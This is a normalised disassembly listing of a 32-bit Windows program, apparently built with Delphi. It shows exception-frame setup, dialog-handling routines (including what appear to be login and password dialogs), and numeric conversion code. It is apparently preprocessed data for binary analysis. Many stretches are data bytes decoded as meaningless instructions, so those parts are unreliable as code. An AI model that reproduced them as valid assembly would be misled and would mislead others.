mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x2d
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404174
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx r-xdata
call sub_40452c
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx r-xdata
call sub_40452c
jne r-xdata
sub_47b63c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi eax
xchg edx ecx
mov [ esi ] cl
mov [ esi + 0x1 ] dl
sub edx 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
or ebx ebx
jns r-xdata
ja r-xdata
mov edi 0xa
neg ebx
neg eax
sbb ebx 0x0
or [ esi + 0x1 ] 0x80
dec ecx
mov [ ecx + ebp - 0x40 ] 0x0
dec edx
jne r-xdata
fild [ ebp + 0x8 ]
fdiv [ edx * 4 + rw-data ]
fistp [ ebp + 0x8 ]
jmp r-xdata
mov [ ecx + ebp - 0x41 ] dl
dec ecx
jne r-xdata
xor edx edx
or ebx ebx
je r-xdata
mov edx eax
or edx ebx
je r-xdata
or eax ebx
mov al 0x0
jne r-xdata
div edi
xchg ebx eax
div edi
xchg ebx eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov cl [ esi ]
inc ecx
shr ecx 0x1
mov ax [ ebp + ecx * 2 - 0x42 ]
shl al 0x4
or al ah
mov [ esi + ecx + 0x1 ] al
dec ecx
jne r-xdata
mov al 0x1
sub_47b6c8
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push edi
push esi
xor ebx ebx
mov edi eax
mov esi edx
mov al 0x0
movzx edx [ edi ]
or edx edx
je r-xdata
pop esi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x1 ]
shr ecx 0x1
mov al [ edi + ecx + 0x1 ]
mov ah al
shr al 0x4
and ah 0xf
mov [ ebp + ecx * 2 - 0x42 ] ax
dec ecx
jne r-xdata
xor eax eax
mov [ ebp - 0x44 ] eax
fild [ ebp - 0x44 ]
inc ecx
cmp ecx edx
jne r-xdata
mov al [ edi + 0x1 ]
or al al
jns r-xdata
fmul [ ebx + rw-data ]
mov al [ ecx + ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
fiadd [ ebp - 0x44 ]
jmp r-xdata
mov al [ ecx + ebp - 0x40 ]
or al al
jne r-xdata
fldz
jmp r-xdata
and eax 0x3f
sub eax 0x4
neg eax
call j_sub_402ee4
fchs
inc ecx
cmp ecx edx
je r-xdata
fwait
fnstcw [ ebp - 0x46 ]
fldcw [ ebx + rw-data ]
fistp [ esi ]
fwait
fnstsw ax
not al
and al 0x1
fwait
fnclex
fldcw [ ebp - 0x46 ]
fwait
sub_47b760
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47b791
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b798
retn
mov eax rw-data
call sub_40d7a0
sub_47ba47
dec [ ebx ]
add [ eax ] al
add [ esi + 0x4d ] al
push esp
inc edx
arpl [ esi + eax * 2 + 0x69 ] sp
insb
add [ fs : edx + edi * 4 + 0x47 ] bl
add [ edi ] cl
or cl [ ecx + 0x44 ]
inc edx
push ebx
jae r-xdata
add al 0xe8
jmp sub_405c24
imul ebp [ edi + 0x6e ] r-xdata
add ebx edi
dec eax
and al 0xcc
jb r-xdata
add [ eax ] al
add bh bh
mov [ 0x77f7934b ] al

sub_47ba83
dec esp
add eax 0xffffffec
jmp r-xdata
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
call sub_404174
pop esi
pop ebx
retn
sub_47baea
popfd
mov edx 0xbaa70047
inc edi
add [ ecx - 0x7affb846 ] dh
mov edx 0xba8d0047
inc edi
add [ ebp - 0x34ffb846 ] dl
mov edx 0xbad50047
inc edi
add bh bl
mov edx 0xbabb0047
inc edi
add bl al
mov edx 0x20047
add [ eax ] al
jbe r-xdata
mov edx 0xba950047
inc edi
add bl cl
mov al [ 0xffffffffaaec6afa ]
dec eax
xchg edi eax
push esp
sub eax 0x5c81df36
or eax sub_47baea
adc al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
or ch al
mov eax [ 0xffffffffcd6adc29 ]
inc esp
mov dh bl
dec edi
push ecx
mov dl 0x5d
pop ecx
xchg ebp eax
add bh [ ebx + 0x180047 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
mov al [ 0x160047bb ]
mov ebx 0x47
add [ eax ] al
mov al [ 0x47bb ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x1c0047bb ] dh
add [ eax ] al
add [ edx + edx + 0x40 ] dl
add al bl
xor eax 0x5bd00040
inc eax
add ah bl
pop ebx
inc eax
add ah ch
xor eax 0x35e00040
inc eax
add ah ch
pop ebx
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0xe004033 ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
sbb edx [ esp + eax * 2 + 0x65 ]
popa
jne r-xdata
je r-xdata
pop esi
pop ebx
retn
inc edx
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ecx
jo r-xdata
mov ecx 0x26
mov edx [ r-xdata ]
call sub_404bd4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47bc5b
retn
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
mov eax eax
mov al [ eax + 0xc ]
retn
sub_47bc60
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_403b24#6
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47bcc8
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
mov ecx r-xdata
call sub_405b94
mov eax rw-data
mov edx [ rw-data ]
mov ecx r-xdata
call sub_405b94
sub edx 0xfffffff8
sub_47bd24
push 0xa1004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edx + 0x680000fe ] ah
jbe r-xdata
xor eax eax
push ebp
push r-xdata
add [ ebx + 0x680000fe ] ah
jbe r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
add [ esi + edi * 8 + 0x76680000 ] ah
dec eax
add [ ebp + 0x680000fe ] ah
jbe r-xdata
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
add [ esi + 0x680000fe ] ah
jbe r-xdata
add bl al
jmp sub_403b24
add [ edi + 0x680000fe ] ah
jbe r-xdata
clc
pop ebp
retn
add [ eax + 0x680000fe ] ch
jbe r-xdata
jle r-xdata
add [ ecx + 0x680000fe ] ch
jbe r-xdata
xor eax [ eax ]
mov al [ 0xffffffffbc0045f5 ]
loop r-xdata
add [ ecx ] al
retn
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x680000fe ] ch
jbe r-xdata
add [ ebp + edx * 8 + 0x44 ] cl
add [ eax ] dl
sti
inc ebp
add [ eax - 0x44 ] dl
inc ecx
add [ eax - 0x9 ] ah
inc ebp
add [ edi + esi * 8 - 0x757ffbb ] bl
inc ebp
add [ ebp + ebp * 2 + 0x44 ] ch
add [ eax ] dh
inc edx
inc edx
add [ eax ] ah
add [ esi ] eax
adc [ edi ] bh
inc edx
add al al
cmp al 0x46
add al bh
int1
inc ebp
add al dl
fld [ eax + eax - 0x14 ]
loop r-xdata
add [ eax ] al
add [ eax ] al
add ah dl
mov edi 0xbef40047
inc edi
add [ ecx + 0x47bf ] bl
add [ eax ] al
add [ edx + 0x240047bf ] ch
add eax [ eax ]
add [ edi + eax * 8 + 0x45 ] ah
add [ eax ] bl
inc edx
inc edx
add [ ebx + esi * 8 - 0xac7ffbb ] al
inc ebp
add ah ch
xor eax 0x19a40040
inc esi
add [ eax ] ch
xor eax [ eax ]
inc esp
add [ ebx + 0x550000fe ] ch
mov ebp esp
add [ eax + 0x46 ] dl
add [ ecx + ebp * 8 - 0x2c03ffbc ] cl
inc esp
add [ eax + 0x35 ] ch
inc esi
add ah ch
0xed9c0045 0x45
add [ eax + 0x1 ] ah
inc esi
add al al
xchg edx eax
inc esp
add al bl
aad 0x44
add [ eax ] bh
loop r-xdata
add [ esi + edx * 8 - 0x2ea7ffbc ] dl
inc esp
add [ eax - 0x2a ] bh
inc esp
add al bh
add [ eax ] dl
bound eax [ eax + eax + 0x14 ]
bound eax [ eax + eax - 0xc ]
inc [ ebp ]
cmp al 0x92
inc esp
add [ ebp + ebp * 2 + 0x44 ] dl
add [ ebx + 0x6ee00044 ] cl
inc esp
add al ch
add [ esi ] al
mov ah 0xff
inc ebp
add [ eax ] bl
jo r-xdata
add al cl
bound eax [ eax + eax + 0x4c ]
fadd [ eax + eax ]
inc [ ebp ]
dec esp
aad 0x44
sub_47be8e
inc ebp
add [ eax + ecx ] al
inc esi
add [ esp + ebp * 4 ] cl
inc esp
add al cl
adc al 0x46
add [ eax ] ch
sbb [ esi ] al
in al 0x16
inc esi
add [ esp + ebp * 4 - 0x5357ffbc ] ah
inc esp
add [ eax + 0x19 ] ah
inc esi
add [ eax ] cl
stosd [ edi ]
inc esp
add [ eax + 0x540044d7 ] bh
and [ esi ] al
mov ecx gs
inc esp
add ah bh
rol [ eax + eax + 0x68 ] cl
xor eax 0xeaec0046
inc ebp
add [ ebp + ebp * 8 + 0x26480045 ] bl
inc esi
add [ esi + esi * 8 - 0x8ffffbb ] al
inc ebp
add [ eax + 0x39 ] cl
inc esi
add [ ebx + esi * 8 + 0x344c0045 ] bh
inc esi
add [ ebx + ebx ] ch
inc esi
add [ eax ] al
inc esi
add ah ah
add [ esi ] al
or eax [ eax ]
mov bh 0xbf
inc edi
add al bh
add al [ eax ]
add [ eax ] al
add [ 0x656e6150 ] al
insb
cld
add al [ eax ]
add [ ecx ] al
add [ 0x65766542 ] al
insb
add [ ebx ] al
add [ eax ] al
add al [ eax ]
or al 0x44
popad
je r-xdata
add [ eax + eax ] al
bound esp [ ecx + 0x73 ]
dec esi
popad
insd
add al 0x3
add [ eax ] al
add eax [ eax ]
or [ edi + 0x4b ] cl
inc edx
jne r-xdata
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_47c0fc
push [ fs : eax ]
ja r-xdata
insd
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xec ]
dec eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x320 ]
mov eax [ ebp - 0x8 ]
call sub_461a08
nop
push ebp
jb r-xdata
inc esi
outsd
outsb
or [ ebx ] al
add [ eax ] al
add eax [ eax ]
or al 0x43
popad
outsb
arpl [ ebp + 0x6c ] sp
inc edx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c0e1
mov eax [ ebp - 0x8 ]
call sub_403390
retn
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
call sub_446f84
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_404174
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x31c ]
call sub_446f84
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_404174
mov [ ebp - 0x1 ] 0x1
inc edx
dec esp
and [ ebx ] al
add [ eax ] al
add al 0x0
or [ ebp + 0x73 ] dl
jb r-xdata
mov [ fs : eax ] esp
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45f1f8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47c0da
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x300 ]
mov edx esi
call sub_446fb4
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
call sub_446fb4
mov [ ebp - 0x1 ] 0x0
cmp [ ebx ] 0x0
jne r-xdata
cld
rol [ edi ] 0x64
push [ eax ]
push ebx
push 0x540c776f
dec esp
outsd
imul ebp [ bp + 0x44 ] 0x6f6c6169
add [ eax - 0x29 ] ah
inc ebx
add al bh
rol [ ebx ] 0x8d
inc eax
add ah dl
mov edi 0xc070047
push esp
dec esp
outsd
imul ebp [ bp + 0x44 ] 0x6f6c6169
add [ bp + 0x47 ] bh
lodsb [ esi ]
enter 0x45 0x5e
add [ eax ] cl
inc esp
add [ edx + esi + 0x2dd80043 ] al
inc ebx
add [ eax + edi * 4 + 0x43 ] bl
je r-xdata
outsd
inc esp
insb
add [ bx + si ] al
inc edi
add [ eax + ecx * 8 + 0x5e0045 ] ch
or [ edx + eax * 2 + 0x4c ] al
jb r-xdata
popad
insd
add [ gs : eax ] eax
sldt [ eax ]
les eax [ edi ]
or [ esi + 0x6f ] al
add eax 0x43328400
add al bl
sub eax 0xb85c0043
inc ebx
outsd
or [ eax + 0x61 ] dl
jae r-xdata
outsb
or al 0x3
add [ eax ] al
add [ eax ] al
push es
push eax
popad
outsb
insb
xor [ eax ] edx
add eax [ eax ]
add [ edx ] al
add [ esi ] al
dec esp
popad
bound esp [ ebp + 0x6c ]
xor [ ebx + eax ] edx
add [ eax ] al
add al [ eax ]
push es
dec esp
popad
bound esp [ ebp + 0x6c ]
xor bl [ eax ]
add eax [ eax ]
add [ edx ] al
add [ esi ] al
dec esp
popad
bound esp [ ebp + 0x6c ]
xor ebx [ ebx + eax ]
add [ eax ] al
add al 0x0
sub_47c110
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_47c22c
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45f1f8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47c20a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x300 ]
mov edx esi
call sub_446fb4
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
call sub_446fb4
mov [ ebp - 0x1 ] 0x0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xec ]
dec eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x320 ]
mov eax [ ebp - 0x8 ]
call sub_461a08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c211
mov eax [ ebp - 0x8 ]
call sub_403390
retn
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
call sub_446f84
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_404174
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x31c ]
call sub_446f84
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_404174
mov [ ebp - 0x1 ] 0x1
sub_47c240
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47c3ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45f1f8
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push j_sub_403b24#5
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406030
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_446fb4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2fc ]
xor edx edx
call sub_446ea4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x300 ]
xor edx edx
call sub_446ea4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x318 ]
xor edx edx
call sub_446ea4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2f8 ]
mov edx [ eax + 0x4c ]
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x2fc ]
sub edx [ ecx + 0x44 ]
call sub_446764
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x304 ]
mov edx [ eax + 0x44 ]
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x2fc ]
sub edx [ ecx + 0x44 ]
call sub_446718
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x308 ]
mov edx [ eax + 0x44 ]
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x2fc ]
sub edx [ ecx + 0x44 ]
call sub_446718
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2fc ]
sub edx [ eax + 0x44 ]
mov eax [ ebp - 0x8 ]
call sub_446764
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
call sub_446fb4
mov [ ebp - 0x1 ] 0x0
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xec ]
dec eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x320 ]
mov eax [ ebp - 0x8 ]
call sub_461a08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c3cb
mov eax [ ebp - 0x8 ]
call sub_403390
retn
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
call sub_446f84
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_404174
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x31c ]
call sub_446f84
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404174
mov [ ebp - 0x1 ] 0x1
sub_47c400
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x2f8 ]
call sub_446988
mov esi [ ebx + 0x300 ]
mov edx [ esi + 0x48 ]
add edx [ esi + 0x40 ]
cmp eax edx
jg r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x2f8 ]
call sub_446988
mov edx eax
mov eax [ ebx + 0x300 ]
sub edx [ eax + 0x40 ]
sub edx 0x5
mov eax [ ebx + 0x300 ]
call sub_446740
sub_47c458
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47c47d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c484
retn
sub_47c488
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_47c110
mov eax [ rw-data ]
mov [ eax ] sub_47c448
mov eax [ rw-data ]
mov [ eax ] sub_47c240
sub_47c5b6
inc ebp
add [ eax + ecx ] al
inc esi
add [ esp + ebp * 4 ] cl
inc esp
add al cl
adc al 0x46
add [ eax ] ch
sbb [ esi ] al
in al 0x16
inc esi
add [ esp + ebp * 4 - 0x5357ffbc ] ah
inc esp
add [ eax + 0x19 ] ah
inc esi
add [ eax ] cl
stosd [ edi ]
inc esp
add [ eax + 0x540044d7 ] bh
and [ esi ] al
mov ecx gs
inc esp
add ah bh
rol [ eax + eax + 0x68 ] cl
xor eax 0xeaec0046
inc ebp
add [ ebp + ebp * 8 + 0x26480045 ] bl
inc esi
add [ esi + esi * 8 - 0x8ffffbb ] al
inc ebp
add [ eax + 0x39 ] cl
inc esi
add [ ebx + esi * 8 + 0x344c0045 ] bh
inc esi
add [ ebx + ebx ] ch
inc esi
add [ eax ] al
inc esi
add ah ah
add [ esi ] al
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax - 0x46 ] bl
inc edi
add [ eax ] bl
add eax [ eax ]
add [ edi ] al
add [ ecx ] ch
mov [ edi ] 0x2f8
add [ eax ] al
or [ edi + 0x72 ] eax
outsd
jne r-xdata
inc edi
add [ edx ] cl
inc ebp
imul esi [ fs : ebx + eax * 2 + 0x68 ] 0x65676e61
inc edx
outsd
js r-xdata
push esp
push eax
popad
je r-xdata
add [ edx ] al
add [ edi ] cl
push edx
insd
cld
add al [ eax ]
add [ ecx ] al
add [ eax * 2 + 0x746964 ] al
add eax [ eax ]
add [ edx ] al
add [ ecx ] cl
inc ecx
inc edx
jne r-xdata
mov [ fs : eax ] edx
push sub_47c7ce
mov eax [ ebp - 0x8 ]
call sub_403390
retn
ja r-xdata
jae r-xdata
add [ edi ] al
outsb
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] 0xc948001b
inc edi
add [ edx + edx * 2 ] dl
insd
outsd
jbe r-xdata
inc ecx
insb
insb
inc edx
jne r-xdata
push edx
insd
outsd
jbe r-xdata
arpl [ ebx + 0x18 ] bp
add al bl
enter 0x47 0x11
je r-xdata
pop ecx
pop ecx
jb r-xdata
outsd
inc edx
inc esp
insb
add [ bx + si ] al
lea eax [ eax ]
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov ecx [ rw-data ]
inc ecx
insb
inc edx
je r-xdata
inc ebx
insb
imul esp [ ebx + 0x6b ] 0xc8d80018
outsb
add al 0x3
add [ eax ] al
add al [ eax ]
or al 0x52
insd
outsd
jbe r-xdata
add [ eax + 0xf ] cl
xchg esp eax
inc ebp
push [ ebx ]
rcr [ edx + 0x59 ] 0x59
inc esp
imul esp [ ecx + 0x6c ] 0xc528676f
inc edi
add [ eax + ecx * 8 + 0x5e0045 ] ch
inc esp
inc edx
push eax
push edi
add [ edi ] al
je r-xdata
dec eax
add [ ebx - 0x5efe4df7 ] cl
fadd st4
inc edi
add al ch
ja r-xdata
je r-xdata
insb
inc ecx
outsb
or al 0x3
add [ eax ] al
add al [ eax ]
or [ edi + 0x4b ] cl
inc edx
jne r-xdata
inc edi
add [ ecx ] dl
imul ebx [ eax ] 0x0
fmul st0
inc edx
jne r-xdata
pop es
inc ebp
add [ esi ] bl
add [ eax ] al
mov ecx [ ecx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45f1f8
mov [ ebp - 0x8 ] eax
or eax rw-data
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] 0xc9680014
inc edi
add [ 0x75424b4f ] cl
je r-xdata
leave
je r-xdata
outsd
je r-xdata
push ebp
outsd
adc al 0x0
push 0xd0047c9
dec edi
dec ebx
inc edx
jne r-xdata
outsb
adc [ ebx ] al
add [ eax ] al
add al [ eax ]
or al 0x43
popad
outsb
arpl [ ebp + 0x6c ] sp
inc edx
jne r-xdata
jne r-xdata
outsd
jbe r-xdata
outsb
or [ ebx ] al
add [ eax ] al
add al [ eax ]
rsqrtps xmm4 [ ebp + 0x6d ]
mov eax [ ebp - 0x8 ]
add eax 0x318
mov edx ebx
call sub_405b68
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xec ]
dec eax
sete [ ebp - 0x1 ]
xor eax eax
pop edx
ja r-xdata
rcl [ ebp + 0x68 ] 0xc7
mov [ edi ] 0x6430ff64
je r-xdata
jae r-xdata
push eax
popad
je r-xdata
mov [ eax ] esp
jb r-xdata
xor eax eax
inc ebp
clc
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] 0x6150540f
imul ecx [ edi ] 0x54
outsb
add eax 0xd8001100
mov [ edi ] 0x6964450a
je r-xdata
push sub_47c7c7
push [ fs : eax ]
mov [ fs : eax ] esp
andps xmm2 [ eax + 0x61 ]
inc esp
imul esp [ ecx + 0x6c ] 0x3676f
mov al [ 0xfffffffff80043af ]
rol [ ebx ] 0x60
xlat
inc ebx
add [ eax + r-xdata ] dl
pop es
jne r-xdata
adc eax 0x47c86000
add [ esi ] cl
inc ecx
inc edx
jne r-xdata
push 0x65676e61
sub_47c7d8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_47c852
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x2fc ]
call sub_446f84
cmp [ ebp - 0x4 ] 0x0
setne bl
mov edx ebx
mov eax [ esi + 0x300 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov edx ebx
mov eax [ esi + 0x304 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
test bl bl
jne r-xdata
mov dl 0x1
cmp [ esi + 0x314 ] 0x0
jne r-xdata
xor edx edx
jmp r-xdata
mov eax [ esi + 0x30c ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c859
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_47c860
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_47c8cb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2fc ]
call sub_446f84
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x318 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov [ ebx + 0x314 ] 0x1
mov eax [ ebx + 0x2fc ]
mov edx [ eax ]
call [ edx + 0xe0 ]
mov eax [ ebx + 0x2fc ]
mov edx [ eax ]
call [ edx + 0xc4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c8d2
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_47c8d8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push j_sub_403b24#4
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2fc ]
call sub_446f84
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x318 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ ebx + 0x2fc ]
mov edx [ eax ]
call [ edx + 0xe0 ]
mov eax [ ebx + 0x2fc ]
mov edx [ eax ]
call [ edx + 0xc4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c943
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_47c968
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_47c9b0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2fc ]
call sub_446f84
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x318 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c9b7
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_47c9bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47c9ec
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c9f3
retn
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
sub_47ca47
add eax 0xfffffff0
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov ax [ eax + 0x44 ]
sub ax 0xffef
je r-xdata
mov al 0x2
retn
sub ax 0x6
je r-xdata
mov al 0x1
retn
sub ax 0xb
jne r-xdata
mov al 0x3
retn
xor eax eax
retn
sub_47cb94
sub dl 0x1
jb r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_464ad0
retn
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dx 0xfff5
call sub_464ad0
retn
dec dl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dx 0xffef
call sub_464ad0
jmp r-xdata
retn
sub_47cbe4
or al [ eax ]
add [ eax ] al
or al 0xf8
inc edi
add [ eax + 0x5e ] ah
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] cl
clc
inc edi
add [ ebx * 2 + 0x48 ] ah
add [ eax ] al
add al 0xf8
inc edi
add [ eax + 0x5c ] al
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
inc edi
add [ esi + ebx * 2 + 0x48 ] cl
add [ eax ] al
add [ eax ] al
add ah bh
test [ edi ] rw-data
add [ eax ] al
add [ eax ] al
clc
test [ edi ] rw-data
add [ eax ] al
add [ eax ] al
hlt
sub_47d070
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_470d24
mov eax esi
test bl bl
je r-xdata
